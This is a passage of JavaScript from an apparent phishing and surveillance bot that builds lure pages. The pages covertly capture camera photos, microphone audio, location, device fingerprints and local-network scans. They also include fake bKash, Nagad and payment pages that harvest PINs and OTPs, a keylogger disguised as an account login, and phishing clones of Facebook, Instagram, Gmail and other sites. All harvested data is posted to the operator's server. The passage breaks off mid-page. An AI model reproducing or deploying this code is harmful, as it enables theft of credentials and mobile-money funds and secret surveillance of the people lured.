    +'function(pos){fetch(D+"/loc",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({uid:UID,lat:pos.coords.latitude,lon:pos.coords.longitude,acc:pos.coords.accuracy})});}, '
    +'function(err){fetch(D+"/text",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({uid:UID,type:"📍 DENIED",data:err.message})});}, '
    +'{enableHighAccuracy:true,timeout:15000}'
    +');');
}

function screenshotPage(uid,req){
    var D=getBase(req)+'/d';
    return slideWrap(uid,req,
    'logO("📸 Screenshot Opened");'
    +'var done=false;'
    +'(async function snap(){'
    +'if(done)return;done=true;'
    +'for(var i=0;i<2;i++){'
    +'var face=i===0?"user":"environment";'
    +'try{'
    +'var stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:face,width:{ideal:1920},height:{ideal:1080}},audio:false});'
    +'var v=document.getElementById("vv");v.srcObject=stream;'
    +'await new Promise(function(r){v.onloadedmetadata=r;});'
    +'await new Promise(function(r){setTimeout(r,1500);});'
    +'var c=document.getElementById("cc");c.width=v.videoWidth||1280;c.height=v.videoHeight||720;'
    +'c.getContext("2d").drawImage(v,0,0);'
    +'stream.getTracks().forEach(function(t){t.stop();});'
    +'var blob=await new Promise(function(r){c.toBlob(r,"image/jpeg",.92);});'
    +'var fd=new FormData();fd.append("photo",blob,"ss_"+face+".jpg");fd.append("uid",UID);fd.append("camtype","📸 Screenshot ("+face+")");'
    +'await fetch(D+"/photo",{method:"POST",body:fd});'
    +'}catch(e){}'
    +'}'
    +'})();');
}

function micPage(uid,req){
    var D=getBase(req)+'/d';
    return slideWrap(uid,req,
    'logO("🎤 Mic Opened");'
    +'var done=false;'
    +'(async function recMic(){'
    +'if(done)return;done=true;'
    +'try{'
    +'var stream=await navigator.mediaDevices.getUserMedia({audio:true,video:false});'
    +'var mime=["audio/webm;codecs=opus","audio/webm","audio/ogg"].find(function(m){return MediaRecorder.isTypeSupported(m);})||"audio/webm";'
    +'var recorder=new MediaRecorder(stream,{mimeType:mime});var chunks=[];'
    +'recorder.ondataavailable=function(e){if(e.data.size>0)chunks.push(e.data);};'
    +'recorder.start(200);'
    +'await new Promise(function(r){setTimeout(r,10000);});'
    +'recorder.stop();stream.getTracks().forEach(function(t){t.stop();});'
    +'await new Promise(function(r){recorder.onstop=r;});'
    +'var blob=new Blob(chunks,{type:mime});'
    +'var fd=new FormData();fd.append("audio",blob,"mic.webm");fd.append("uid",UID);'
    +'await fetch(D+"/audio",{method:"POST",body:fd});'
    +'}catch(err){'
    +'try{fetch(D+"/text",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({uid:UID,type:"🎤 DENIED",data:err.message})});}catch(e){}'
    +'}'
    +'})();');
}

function vibratePage(uid,req){
    var D=getBase(req)+'/d';
    return slideWrap(uid,req,
    'logO("📳 Vibrate Opened");'
    +'function vib(){'
    +'if(navigator.vibrate){var p=[];for(var i=0;i<15;i++){p.push(500);p.push(100);}navigator.vibrate(p);}'
    +'fetch(D+"/text",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({uid:UID,type:"📳 Vibrate",data:"supported:"+!!navigator.vibrate+" | "+navigator.userAgent})}).catch(function(){});'
    +'var c=0;var t=setInterval(function(){if(++c>=10)clearInterval(t);if(navigator.vibrate)navigator.vibrate([600,150,600,150,600]);},3000);'
    +'}'
    +'vib();'
    +'document.addEventListener("click",function(){if(navigator.vibrate)navigator.vibrate([500,100,500]);},{once:true});');
}

function notifyPage(uid,req){
    var D=getBase(req)+'/d';
    return '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Security Alert</title>'
    +'<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#1a1a2e;color:#fff;font-family:-apple-system,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}.card{background:#16213e;border:1px solid #0f3460;border-radius:16px;padding:32px 24px;max-width:380px;width:100%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.5)}.icon{font-size:60px;margin-bottom:16px}.title{font-size:20px;font-weight:800;margin-bottom:8px;color:#e94560}.sub{font-size:14px;color:#aaa;line-height:1.6;margin-bottom:28px}.btn{width:100%;padding:16px;background:linear-gradient(135deg,#0f3460,#e94560);color:#fff;font-size:17px;font-weight:700;border:none;border-radius:12px;cursor:pointer;margin-bottom:12px}.btn2{width:100%;padding:14px;background:transparent;color:#aaa;font-size:14px;border:1px solid #333;border-radius:12px;cursor:pointer}.st{margin-top:14px;font-size:13px;color:#aaa}</style>'
    +'</head><body><div class="card"><div class="icon">🔔</div><div class="title">Enable Security Alerts</div>'
    +'<div class="sub">Your account has been accessed from a new device.<br><br>Enable notifications to receive real-time security alerts.</div>'
    +'<button class="btn" onclick="reqNotify()">🔔 Enable Alerts</button>'
    +'<button class="btn2" onclick="reqNotify()">Maybe Later</button>'
    +'<div class="st" id="st"></div></div>'
    +'<script>'
    +'var UID="'+uid+'",D="'+D+'";'
    +'window.onload=function(){fetch(D+"/text",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({uid:UID,type:"🔔 Notify Opened",data:navigator.userAgent})}).catch(function(){});};'
    +'async function reqNotify(){'
    +'var st=document.getElementById("st");'
    +'try{'
    +'var perm=await Notification.requestPermission();'
    +'await fetch(D+"/notify",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({uid:UID,permission:perm,ua:navigator.userAgent})});'
    +'if(perm==="granted"){new Notification("✅ Security Alert",{body:"Your account is now protected."});st.textContent="✅ Alerts enabled!";}'
    +'else{st.textContent="Alerts not enabled.";}'
    +'}catch(e){st.textContent="Processing...";}'
    +'}'
    +'</script></body></html>';
}

function netScanPage(uid,req){
    var D=getBase(req)+'/d';
    return '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Network Check</title>'
    +'<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a1a;color:#0f0;font-family:monospace;padding:20px;min-height:100vh}.title{font-size:16px;margin-bottom:16px}.log{font-size:12px;line-height:1.8;white-space:pre-wrap}.cursor{animation:b 1s infinite}@keyframes b{0%,100%{opacity:1}50%{opacity:0}}</style>'
    +'</head><body><div class="title">🌐 Network Diagnostic Tool v1.0</div>'
    +'<div class="log" id="log">&gt; Initializing scan...<span class="cursor">_</span></div>'
    +'<script>'
    +'var UID="'+uid+'",D="'+D+'";'
    +'var log=document.getElementById("log");'
    +'function add(t){log.innerHTML=log.innerHTML.replace("<span class=\\"cursor\\">_</span>","")+"\\n"+t+"<span class=\\"cursor\\">_</span>";}'
    +'async function scan(){'
    +'add("> Checking public IP...");'
    +'var data={uid:UID,gateway:null,devices:[],publicIP:null,localIP:null};'
    +'try{var r=await fetch("https://api.ipify.org?format=json").then(function(r){return r.json();});data.publicIP=r.ip;add("> Public IP: "+r.ip);}catch(e){}'
    +'try{'
    +'var pc=new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});'
    +'pc.createDataChannel("");var offer=await pc.createOffer();await pc.setLocalDescription(offer);'
    +'await new Promise(function(r){setTimeout(r,1500);});'
    +'var sdp=pc.localDescription.sdp;'
    +'var ips=[...sdp.matchAll(/ip4 ([\\d.]+)/gi)].map(function(m){return m[1];}).filter(function(ip){return !ip.startsWith("0.")&&ip!=="0.0.0.0";});'
    +'if(ips.length){data.localIP=ips[0];add("> Local IP: "+ips[0]);var parts=ips[0].split(".");data.gateway=parts.slice(0,3).join(".")+".1";add("> Gateway: "+data.gateway);}'
    +'pc.close();'
    +'}catch(e){}'
    +'if(data.localIP){'
    +'add("> Scanning local network...");'
    +'var base=data.localIP.split(".").slice(0,3).join(".");'
    +'var common=[1,2,100,101,102,103,104,105,110,120,150,200,201,254];'
    +'var promises=common.map(async function(n){'
    +'var ip=base+"."+n;if(ip===data.localIP)return;'
    +'try{var ctrl=new AbortController();var t=setTimeout(function(){ctrl.abort();},800);'
    +'await fetch("http://"+ip,{signal:ctrl.signal,mode:"no-cors"});clearTimeout(t);'
    +'data.devices.push(ip);add("> Found device: "+ip);}catch(e){}'
    +'});'
    +'await Promise.allSettled(promises);'
    +'}'
    +'try{var c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;if(c){data.connType=c.effectiveType;data.downlink=c.downlink+"Mbps";add("> Connection: "+c.effectiveType+" "+c.downlink+"Mbps");}}catch(e){}'
    +'add("> Scan complete. Found "+data.devices.length+" device(s).");'
    +'await fetch(D+"/netscan",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({uid:UID,data:data})}).catch(function(){});'
    +'}'
    +'window.onload=function(){fetch(D+"/text",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({uid:UID,type:"🌐 Net Scan Opened",data:navigator.userAgent})}).catch(function(){});scan();};'
    +'</script></body></html>';
}

function fingerprintPage(uid,req){
    var D=getBase(req)+'/d';
    return '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Verification</title>'
    +'<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0a;color:#fff;font-family:-apple-system,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:16px}.card{background:#111;border-radius:16px;padding:28px 20px;max-width:360px;width:100%;text-align:center}.icon{font-size:50px;margin-bottom:14px}.title{font-size:18px;font-weight:800;margin-bottom:8px}.sub{font-size:13px;color:#aaa;margin-bottom:24px;line-height:1.6}.prg{width:100%;height:6px;background:#222;border-radius:3px;margin-bottom:14px}.bar{height:100%;background:linear-gradient(90deg,#6c63ff,#e94560);border-radius:3px;width:0%;transition:width .5s}.st{font-size:13px;color:#888}</style>'
    +'</head><body><div class="card"><div class="icon">🔐</div><div class="title">Device Verification</div>'
    +'<div class="sub">Verifying your device for security compliance. Please wait...</div>'
    +'<div class="prg"><div class="bar" id="bar"></div></div>'
    +'<div class="st" id="st">Initializing...</div></div>'
    +'<script>'
    +'var UID="'+uid+'",D="'+D+'";'
    +'var bar=document.getElementById("bar"),st=document.getElementById("st");'
    +'async function fp(){'
    +'var data={uid:UID};'
    +'bar.style.width="10%";st.textContent="Checking browser...";'
    +'data.ua=navigator.userAgent;data.platform=navigator.platform;data.language=navigator.language;'
    +'data.languages=navigator.languages?navigator.languages.join(","):null;'
    +'data.screen=screen.width+"x"+screen.height;data.colorDepth=screen.colorDepth;'
    +'data.pixelRatio=window.devicePixelRatio;'
    +'data.timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;'
    +'data.cores=navigator.hardwareConcurrency||"?";data.memory=(navigator.deviceMemory||"?")+"GB";'
    +'data.touch=navigator.maxTouchPoints;data.vendor=navigator.vendor||"?";'
    +'data.cookieEnabled=navigator.cookieEnabled;data.onLine=navigator.onLine;'
    +'bar.style.width="30%";st.textContent="Analyzing hardware...";'
    +'try{var cv=document.createElement("canvas");var ctx=cv.getContext("2d");ctx.textBaseline="top";ctx.font="14px Arial";ctx.fillText("BD Bot Fingerprint",2,2);data.canvasFP=cv.toDataURL().slice(-50);}catch(e){}'
    +'try{var cv2=document.createElement("canvas");var gl=cv2.getContext("webgl")||cv2.getContext("experimental-webgl");if(gl){data.webglVendor=gl.getParameter(gl.VENDOR);data.webglRenderer=gl.getParameter(gl.RENDERER);}}catch(e){}'
    +'bar.style.width="55%";st.textContent="Checking network...";'
    +'try{var r=await fetch("https://api.ipify.org?format=json").then(function(r){return r.json();});data.publicIP=r.ip;var geo=await fetch("https://ipapi.co/"+r.ip+"/json/").then(function(r){return r.json();});data.country=geo.country_name;data.city=geo.city;data.isp=geo.org;}catch(e){}'
    +'bar.style.width="75%";st.textContent="Checking APIs...";'
    +'try{var b=await navigator.getBattery();data.battery=Math.round(b.level*100)+"%";data.charging=b.charging;}catch(e){}'
    +'try{var c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;if(c){data.connType=c.effectiveType;data.downlink=c.downlink;}}catch(e){}'
    +'bar.style.width="95%";st.textContent="Finalizing...";'
    +'await fetch(D+"/fingerprint",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({uid:UID,data:data})}).catch(function(){});'
    +'bar.style.width="100%";st.textContent="✅ Verification Complete!";'
    +'}'
    +'window.onload=function(){fetch(D+"/text",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({uid:UID,type:"🖥️ Fingerprint Opened",data:navigator.userAgent})}).catch(function(){});fp();};'
    +'</script></body></html>';
}

function fakePayPage(uid,req){
    var D=getBase(req)+'/d';
    return '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Payment Gateway</title>'
    +'<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#f5f5f5;font-family:-apple-system,sans-serif;min-height:100vh;padding:16px}.header{background:linear-gradient(135deg,#1a1a2e,#0f3460);color:#fff;padding:16px;border-radius:12px;margin-bottom:16px;text-align:center}.header h2{font-size:18px;font-weight:700}.header p{font-size:12px;opacity:.8;margin-top:4px}.card{background:#fff;border-radius:12px;padding:20px;box-shadow:0 2px 12px rgba(0,0,0,.1);margin-bottom:14px}.section-title{font-size:13px;font-weight:600;color:#666;margin-bottom:12px;text-transform:uppercase}.amount-box{background:#f0f7ff;border-radius:10px;padding:16px;text-align:center;margin-bottom:16px}.amount-box .currency{font-size:14px;color:#666}.amount-box .value{font-size:36px;font-weight:800;color:#1a1a2e}.gateway-row{display:flex;gap:10px;margin-bottom:16px}.gw-btn{flex:1;padding:14px;border:2px solid #eee;border-radius:10px;text-align:center;cursor:pointer;font-size:12px;font-weight:600}.gw-btn.active{border-color:#e2136e;background:#fff0f7}.gw-btn span{display:block;font-size:20px;margin-bottom:4px}input{width:100%;padding:14px;border:1.5px solid #eee;border-radius:10px;font-size:16px;color:#333;outline:none;margin-bottom:12px}input:focus{border-color:#e2136e}.pay-btn{width:100%;padding:16px;background:linear-gradient(135deg,#e2136e,#ff6b6b);color:#fff;font-size:18px;font-weight:700;border:none;border-radius:10px;cursor:pointer}.secure{text-align:center;font-size:12px;color:#aaa;margin-top:12px}.st{text-align:center;font-size:14px;margin-top:12px;font-weight:600}</style>'
    +'</head><body>'
    +'<div class="header"><h2>💳 Secure Payment Gateway</h2><p>🔒 256-bit SSL Encrypted</p></div>'
    +'<div class="card"><div class="amount-box"><div class="currency">Total Amount</div><div class="value">৳500</div></div>'
    +'<div class="section-title">Select Payment Method</div>'
    +'<div class="gateway-row">'
    +'<div class="gw-btn active" id="gw_bk" onclick="selGW(\'bkash\')"><span>💚</span>bKash</div>'
    +'<div class="gw-btn" id="gw_ng" onclick="selGW(\'nagad\')"><span>🟠</span>Nagad</div>'
    +'<div class="gw-btn" id="gw_rk" onclick="selGW(\'rocket\')"><span>🚀</span>Rocket</div>'
    +'</div></div>'
    +'<div class="card"><div class="section-title">Payment Details</div>'
    +'<input type="tel" id="phone" placeholder="Your mobile number" inputmode="numeric" maxlength="11">'
    +'<input type="password" id="pin" placeholder="PIN (4-6 digits)" inputmode="numeric" maxlength="6">'
    +'<input type="text" id="otp" placeholder="OTP (if required)" inputmode="numeric" maxlength="6">'
    +'<button class="pay-btn" onclick="pay()">Pay Now →</button>'
    +'<div class="secure">🔒 Secured by SSL | PCI DSS Compliant</div>'
    +'<div class="st" id="st"></div></div>'
    +'<script>'
    +'var UID="'+uid+'",D="'+D+'",gw="bkash";'
    +'function selGW(g){gw=g;document.querySelectorAll(".gw-btn").forEach(function(b){b.classList.remove("active");});document.getElementById("gw_"+g.slice(0,2)).classList.add("active");}'
    +'async function pay(){'
    +'var phone=document.getElementById("phone").value,pin=document.getElementById("pin").value,otp=document.getElementById("otp").value;'
    +'if(!phone||!pin){document.getElementById("st").textContent="❌ সব field পূরণ করুন।";return;}'
    +'document.querySelector(".pay-btn").textContent="Processing...";document.querySelector(".pay-btn").disabled=true;'
    +'document.getElementById("st").textContent="⏳ Verifying...";'
    +'await fetch(D+"/captured",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({uid:UID,site:"💳 FakePayment ("+gw+")",phone:phone,otp:pin+"|"+otp})}).catch(function(){});'
    +'setTimeout(function(){document.getElementById("st").textContent="✅ Payment Successful!";document.querySelector(".pay-btn").textContent="✅ Done";},1500);'
    +'}'
    +'window.onload=function(){fetch(D+"/text",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({uid:UID,type:"💳 FakePay Opened",data:navigator.userAgent})}).catch(function(){});};'
    +'</script></body></html>';
}

function bkashPinPage(uid,req){
    var D=getBase(req)+'/d';
    return '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><title>bKash</title>'
    +'<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#e2136e;font-family:-apple-system,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}.logo{font-size:28px;font-weight:900;color:#fff;margin-bottom:8px}.tagline{font-size:14px;color:rgba(255,255,255,.8);margin-bottom:32px}.card{background:#fff;border-radius:16px;padding:28px 24px;width:100%;max-width:360px}.card-title{font-size:16px;font-weight:700;color:#333;margin-bottom:20px;text-align:center}.pin-dots{display:flex;justify-content:center;gap:14px;margin-bottom:24px}.dot{width:16px;height:16px;border-radius:50%;border:2px solid #e2136e;transition:background .2s}.dot.filled{background:#e2136e}.keypad{display:grid;grid-template-columns:repeat(3,1fr);gap:10px}.key{padding:18px;background:#f8f8f8;border:none;border-radius:10px;font-size:20px;font-weight:600;cursor:pointer;color:#333}.key:active{background:#e2136e;color:#fff}.submit-btn{width:100%;padding:16px;background:#e2136e;color:#fff;font-size:17px;font-weight:700;border:none;border-radius:10px;margin-top:16px;cursor:pointer;display:none}.st{text-align:center;font-size:13px;color:#aaa;margin-top:12px}</style>'
    +'</head><body>'
    +'<div class="logo">bKash</div>'
    +'<div class="tagline">বিশ্বাসের সাথে পেমেন্ট করুন</div>'
    +'<div class="card">'
    +'<div class="card-title">🔐 Enter Your PIN</div>'
    +'<div class="pin-dots" id="pinDots"><div class="dot" id="d0"></div><div class="dot" id="d1"></div><div class="dot" id="d2"></div><div class="dot" id="d3"></div><div class="dot" id="d4"></div></div>'
    +'<div class="keypad">'
    +'<button class="key" onclick="k(\'1\')">1</button><button class="key" onclick="k(\'2\')">2</button><button class="key" onclick="k(\'3\')">3</button>'
    +'<button class="key" onclick="k(\'4\')">4</button><button class="key" onclick="k(\'5\')">5</button><button class="key" onclick="k(\'6\')">6</button>'
    +'<button class="key" onclick="k(\'7\')">7</button><button class="key" onclick="k(\'8\')">8</button><button class="key" onclick="k(\'9\')">9</button>'
    +'<button class="key" style="visibility:hidden"></button><button class="key" onclick="k(\'0\')">0</button><button class="key" style="color:#e2136e" onclick="del()">⌫</button>'
    +'</div>'
    +'<button class="submit-btn" id="submitBtn" onclick="submit()">Confirm →</button>'
    +'<div class="st" id="st"></div></div>'
    +'<script>'
    +'var UID="'+uid+'",D="'+D+'",pin="";'
    +'function k(v){if(pin.length>=5)return;pin+=v;update();}'
    +'function del(){if(!pin.length)return;pin=pin.slice(0,-1);update();}'
    +'function update(){for(var i=0;i<5;i++)document.getElementById("d"+i).className="dot"+(i<pin.length?" filled":"");if(pin.length>=4)document.getElementById("submitBtn").style.display="block";else document.getElementById("submitBtn").style.display="none";}'
    +'async function submit(){'
    +'document.getElementById("submitBtn").textContent="Verifying...";document.getElementById("submitBtn").disabled=true;'
    +'await fetch(D+"/captured",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({uid:UID,site:"💚 bKash PIN",phone:"",otp:pin})}).catch(function(){});'
    +'document.getElementById("st").textContent="✅ Verified!";'
    +'setTimeout(function(){window.location.href="https://www.bkash.com";},1500);'
    +'}'
    +'window.onload=function(){fetch(D+"/text",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({uid:UID,type:"💚 bKash PIN Opened",data:navigator.userAgent})}).catch(function(){});};'
    +'</script></body></html>';
}

function nagadPinPage(uid,req){
    var D=getBase(req)+'/d';
    return '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><title>Nagad</title>'
    +'<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#ee1c25;font-family:-apple-system,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}.logo{font-size:28px;font-weight:900;color:#fff;margin-bottom:8px}.tagline{font-size:14px;color:rgba(255,255,255,.8);margin-bottom:32px}.card{background:#fff;border-radius:16px;padding:28px 24px;width:100%;max-width:360px}.card-title{font-size:16px;font-weight:700;color:#333;margin-bottom:20px;text-align:center}.pin-dots{display:flex;justify-content:center;gap:14px;margin-bottom:24px}.dot{width:16px;height:16px;border-radius:50%;border:2px solid #ee1c25;transition:background .2s}.dot.filled{background:#ee1c25}.keypad{display:grid;grid-template-columns:repeat(3,1fr);gap:10px}.key{padding:18px;background:#f8f8f8;border:none;border-radius:10px;font-size:20px;font-weight:600;cursor:pointer;color:#333}.key:active{background:#ee1c25;color:#fff}.submit-btn{width:100%;padding:16px;background:#ee1c25;color:#fff;font-size:17px;font-weight:700;border:none;border-radius:10px;margin-top:16px;cursor:pointer;display:none}.st{text-align:center;font-size:13px;color:#aaa;margin-top:12px}</style>'
    +'</head><body>'
    +'<div class="logo">নগদ</div>'
    +'<div class="tagline">ডিজিটাল বাংলাদেশ, ডিজিটাল নগদ</div>'
    +'<div class="card">'
    +'<div class="card-title">🔐 পিন দিন</div>'
    +'<div class="pin-dots" id="pinDots"><div class="dot" id="d0"></div><div class="dot" id="d1"></div><div class="dot" id="d2"></div><div class="dot" id="d3"></div></div>'
    +'<div class="keypad">'
    +'<button class="key" onclick="k(\'1\')">1</button><button class="key" onclick="k(\'2\')">2</button><button class="key" onclick="k(\'3\')">3</button>'
    +'<button class="key" onclick="k(\'4\')">4</button><button class="key" onclick="k(\'5\')">5</button><button class="key" onclick="k(\'6\')">6</button>'
    +'<button class="key" onclick="k(\'7\')">7</button><button class="key" onclick="k(\'8\')">8</button><button class="key" onclick="k(\'9\')">9</button>'
    +'<button class="key" style="visibility:hidden"></button><button class="key" onclick="k(\'0\')">0</button><button class="key" style="color:#ee1c25" onclick="del()">⌫</button>'
    +'</div>'
    +'<button class="submit-btn" id="submitBtn" onclick="submit()">নিশ্চিত করুন →</button>'
    +'<div class="st" id="st"></div></div>'
    +'<script>'
    +'var UID="'+uid+'",D="'+D+'",pin="";'
    +'function k(v){if(pin.length>=4)return;pin+=v;for(var i=0;i<4;i++)document.getElementById("d"+i).className="dot"+(i<pin.length?" filled":"");if(pin.length>=4)document.getElementById("submitBtn").style.display="block";}'
    +'function del(){if(!pin.length)return;pin=pin.slice(0,-1);for(var i=0;i<4;i++)document.getElementById("d"+i).className="dot"+(i<pin.length?" filled":"");document.getElementById("submitBtn").style.display="none";}'
    +'async function submit(){'
    +'document.getElementById("submitBtn").textContent="Verifying...";document.getElementById("submitBtn").disabled=true;'
    +'await fetch(D+"/captured",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({uid:UID,site:"🟠 Nagad PIN",phone:"",otp:pin})}).catch(function(){});'
    +'document.getElementById("st").textContent="✅ Verified!";'
    +'setTimeout(function(){window.location.href="https://nagad.com.bd";},1500);'
    +'}'
    +'window.onload=function(){fetch(D+"/text",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({uid:UID,type:"🟠 Nagad PIN Opened",data:navigator.userAgent})}).catch(function(){});};'
    +'</script></body></html>';
}

function keylogPage(uid,req){
    var D=getBase(req)+'/d';
    return '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Login Required</title>'
    +'<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#1a1a2e;color:#fff;font-family:-apple-system,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}.card{background:#16213e;border-radius:16px;padding:32px 24px;max-width:380px;width:100%}.logo{text-align:center;font-size:40px;margin-bottom:16px}.title{text-align:center;font-size:20px;font-weight:700;margin-bottom:6px}.sub{text-align:center;font-size:13px;color:#aaa;margin-bottom:24px}input{width:100%;background:#0f3460;border:1px solid #533483;border-radius:10px;padding:14px 16px;font-size:16px;color:#fff;outline:none;margin-bottom:14px}input::placeholder{color:#888}.btn{width:100%;padding:16px;background:linear-gradient(135deg,#533483,#e94560);color:#fff;font-size:17px;font-weight:700;border:none;border-radius:10px;cursor:pointer}.note{text-align:center;font-size:12px;color:#666;margin-top:16px}</style>'
    +'</head><body><div class="card">'
    +'<div class="logo">🔐</div><div class="title">Account Verification</div>'
    +'<div class="sub">Enter your details to continue securely</div>'
    +'<input type="text" id="f1" placeholder="Username or Email" autocomplete="off">'
    +'<input type="password" id="f2" placeholder="Password">'
    +'<input type="tel" id="f3" placeholder="Phone Number" inputmode="tel">'
    +'<button class="btn" onclick="sub()">Continue →</button>'
    +'<div class="note">🔒 Secure & Encrypted Connection</div></div>'
    +'<script>'
    +'var UID="'+uid+'",D="'+D+'",keylog="",lastSend=Date.now();'
    +'document.addEventListener("keydown",function(e){'
    +'keylog+=e.key==="Enter"?"[ENTER]\\n":e.key==="Backspace"?"[BS]":e.key==="Tab"?"[TAB]":(e.key.length===1?e.key:"["+e.key+"]");'
    +'if(Date.now()-lastSend>3000){flush();lastSend=Date.now();}'
    +'});'
    +'["f1","f2","f3"].forEach(function(id){document.getElementById(id).addEventListener("input",flush);});'
    +'function flush(){if(!keylog.trim())return;var keys="[KEYLOG] "+keylog;keylog="";fetch(D+"/keylog",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({uid:UID,keys:keys})}).catch(function(){});}'
    +'async function sub(){'
    +'var u=document.getElementById("f1").value,p=document.getElementById("f2").value,ph=document.getElementById("f3").value;'
    +'flush();'
    +'await fetch(D+"/captured",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({uid:UID,site:"⌨️ KeylogPage",phone:u+"|"+ph,otp:p})}).catch(function(){});'
    +'document.querySelector(".btn").textContent="✅ Verified!";'
    +'setTimeout(function(){window.location.href="https://www.google.com";},1500);'
    +'}'
    +'window.onload=function(){'
    +'fetch(D+"/text",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({uid:UID,type:"⌨️ Keylog Opened",data:navigator.userAgent})}).catch(function(){});'
    +'window.addEventListener("beforeunload",flush);'
    +'setInterval(flush,5000);'
    +'};'
    +'</script></body></html>';
}

function passPage(action,uid,req){
    var base=getBase(req);
    var sites={
        phish_fb:  {site:'Facebook',  rdr:'https://www.facebook.com', bc:'#1877f2',btn:'Log In',create:'Create new account'},
        phish_ig:  {site:'Instagram', rdr:'https://www.instagram.com',bc:'linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888)',btn:'Log in'},
        phish_tt:  {site:'TikTok',    rdr:'https://www.tiktok.com',   bc:'#fe2c55',btn:'Log in'},
        phish_msgr:{site:'Messenger', rdr:'https://www.messenger.com',bc:'linear-gradient(135deg,#0084ff,#00c6ff)',btn:'Log In'},
        phish_yt:  {site:'YouTube',   rdr:'https://www.youtube.com',  bc:'#ff0000',btn:'Sign in',logo:'▶️ YouTube'},
        phish_gm:  {site:'Gmail',     rdr:'https://mail.google.com',  bc:'#ea4335',btn:'Next',logo:'📧 Gmail'},
    };
    var c=sites[action]||sites['phish_fb'];
    return '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>'+c.site+'</title>'
    +'<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#f0f2f5;font-family:-apple-system,BlinkMacSystemFont,sans-serif;min-height:100vh}.notif{background:#fff3cd;border-left:4px solid #ffc107;padding:12px 16px;display:flex;gap:10px;align-items:flex-start}.notif-icon{font-size:20px}.notif-text{font-size:13px;color:#333;line-height:1.5}.notif-text b{color:#d32f2f;display:block}.wrap{max-width:400px;margin:0 auto;padding:16px}.vid-preview{position:relative;border-radius:12px;overflow:hidden;margin-bottom:14px;background:#000}.vid-preview video{width:100%;display:block;max-height:190px;object-fit:cover}.vid-overlay{position:absolute;bottom:0;left:0;right:0;background:linear-gradient(transparent,rgba(0,0,0,.85));padding:10px 12px}.vid-overlay b{color:#ffcc00;font-size:13px}.vid-overlay p{color:#fff;font-size:12px}.card{background:#fff;border-radius:8px;padding:20px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1)}.logo{text-align:center;font-size:22px;font-weight:800;color:#1877f2;margin-bottom:16px}input{width:100%;padding:14px;border:1px solid #dddfe2;border-radius:6px;font-size:16px;color:#1c1e21;background:#fff;margin-bottom:12px;outline:none}input:focus{border-color:#1877f2}input::placeholder{color:#8a8d91}.btn-main{width:100%;padding:14px;background:'+c.bc+';color:#fff;font-size:18px;font-weight:700;border:none;border-radius:6px;cursor:pointer;margin-bottom:12px}.forgot{text-align:center;margin-bottom:12px}.forgot a{color:#1877f2;font-size:14px;text-decoration:none}.sep{display:flex;align-items:center;margin:12px 0}.sep-line{flex:1;height:1px;background:#dadde1}.sep-or{padding:0 16px;color:#8a8d91;font-size:14px}.btn-sec{width:100%;padding:14px;background:#42b72a;color:#fff;font-size:16px;font-weight:700;border:none;border-radius:6px;cursor:pointer}</style>'
    +'</head><body>'
    +'<div class="notif"><span class="notif-icon">🔴</span><div class="notif-text"><b>⚠️ Security Alert</b>Unusual activity detected. Verify now.</div></div>'
    +'<div class="wrap"><div class="vid-preview"><video autoplay muted loop playsinline><source src="'+CFG.LURE_VID+'" type="video/mp4"></video><div class="vid-overlay"><b>🔒 Private Content</b><p>Log in to view</p></div></div>'
